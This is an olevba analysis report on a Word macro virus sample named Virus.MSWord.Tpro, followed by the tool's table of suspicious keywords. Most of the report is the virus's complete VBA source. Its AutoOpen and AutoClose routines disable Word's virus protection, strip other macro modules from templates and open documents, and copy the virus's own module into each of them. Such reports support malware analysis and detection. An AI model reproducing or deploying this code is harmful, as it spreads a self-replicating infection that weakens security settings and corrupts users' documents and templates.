olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tpro-6c881a2bf5df5cb587909771e6e523f87a0eaefd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tpro-6c881a2bf5df5cb587909771e6e523f87a0eaefd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Tpro-6c881a2bf5df5cb587909771e6e523f87a0eaefd - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    Application.Options.VirusProtection = False
End Sub
Sub AutoOpen()
    On Error GoTo ErrorCL
    
    Const aLin As Long = 73

    Dim aTemp As Variant
    Dim aTName As String
    Dim aTPro As Variant
    Dim aPro As Variant
    Dim aName As String
    Dim aDoc As Variant
    Dim aCodeLin As Long
    Dim aTCodeLin As Long
    
    With Application.Options
        .VirusProtection = False
        .SaveInterval = 1
    End With
    
     'D--N
    For Each aTemp In Application.Templates
        With aTemp.VBProject
            aTName = .VBComponents(1).Name
            aTCodeLin = .VBComponents("Module1").CodeModule.CountOfLines
            If aTCodeLin <> aLin Then
                For Each aTPro In .VBComponents
                    If aTPro.Name <> aTName Then
                        .VBComponents.Remove (aTPro)
                    End If
                Next aTPro
                ActiveDocument.VBProject.VBComponents("Module1").Export ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                .VBComponents.Import ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                aTemp.Save
                .VBComponents(1).Name = "ThisDocuments"
            End If
        End With
    Next aTemp
    
     'N--D
    For Each aDoc In Application.Documents
        With aDoc.VBProject
            aName = .VBComponents(1).Name
            aCodeLin = .VBComponents("Module1").CodeModule.CountOfLines
            If aCodeLin <> aLin Then
                For Each aPro In .VBComponents
                    If aPro.Name <> aName Then
                        .VBComponents.Remove (aPro)
                    End If
                Next aPro
                .VBComponents.Import ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                Application.ActiveDocument.Save
            End If
        End With
    Next aDoc
    
    Exit Sub
    
ErrorCL:
    Select Case Err.Number
        Case 53   'There is Not Basic.bas
            Application.NormalTemplate.VBProject.VBComponents("Module1").Export ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
            Resume
        Case -2147352565
            aCodeLin = 0
            Resume Next
    End Select
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|!G5%e               |2147352565                                   |
+----------+--------------------+---------------------------------------------+

